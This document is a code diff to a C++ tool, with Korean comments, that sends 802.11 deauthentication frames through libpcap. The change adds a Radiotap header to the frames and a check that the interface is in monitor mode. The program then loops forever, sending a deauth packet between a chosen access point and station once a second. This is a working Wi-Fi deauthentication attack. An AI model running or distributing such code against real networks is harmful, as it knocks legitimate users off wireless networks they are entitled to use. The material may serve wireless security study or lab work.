@@ -8,6 +8,7 @@
 
 #include "mac.h"
 #include "deauth_packet.h"
+#include "radiotap.h"
 
 using namespace std;
 
@@ -19,15 +20,26 @@ static void usage()
 
 void sendDeauthPacket(pcap_t *handle, const Mac &ap_mac, const Mac &st_mac)
 {
-    DeauthPacket packet(ap_mac, st_mac);
-    vector<uint8_t> deauth_frame = packet.toBytes();
+    // 1. Radiotap 헤더 생성
+    RadiotapHeader radiotap;
+    vector<uint8_t> rtBytes = radiotap.toBytes();
 
-    if (pcap_sendpacket(handle, deauth_frame.data(), deauth_frame.size()) != 0)
+    // 2. Deauth 802.11 관리 프레임 생성
+    DeauthPacket deauth(ap_mac, st_mac);
+    vector<uint8_t> deauthBytes = deauth.toBytes();
+
+    // 3. Radiotap 헤더 + Deauth 프레임 결합
+    vector<uint8_t> fullPacket;
+    fullPacket.reserve(rtBytes.size() + deauthBytes.size());
+    fullPacket.insert(fullPacket.end(), rtBytes.begin(), rtBytes.end());
+    fullPacket.insert(fullPacket.end(), deauthBytes.begin(), deauthBytes.end());
+
+    // 4. pcap_sendpacket로 전송
+    if (pcap_sendpacket(handle, fullPacket.data(), fullPacket.size()) != 0)
     {
         cerr << "Error sending the packet: " << pcap_geterr(handle) << endl;
     }
 }
-
 void sendAuthPacket(pcap_t *handle, const string &iface, const Mac &ap_mac, const Mac &st_mac)
 {
     return;
@@ -112,6 +124,14 @@ int main(int argc, char *argv[])
         exit(EXIT_FAILURE);
     }
 
+    // Radiotap/Monitor check
+    if (pcap_datalink(handle) != DLT_IEEE802_11_RADIO)
+    {
+        cerr << "[-] Not a Radiotap(802.11) interface. Try enabling monitor mode.\n";
+        pcap_close(handle);
+        exit(EXIT_FAILURE);
+    }
+
     while (true)
     {
         // deauth 패킷 전송
@@ -130,5 +150,6 @@ int main(int argc, char *argv[])
         sleep(1);
     }
 
+    pcap_close(handle);
     return 0;
 }
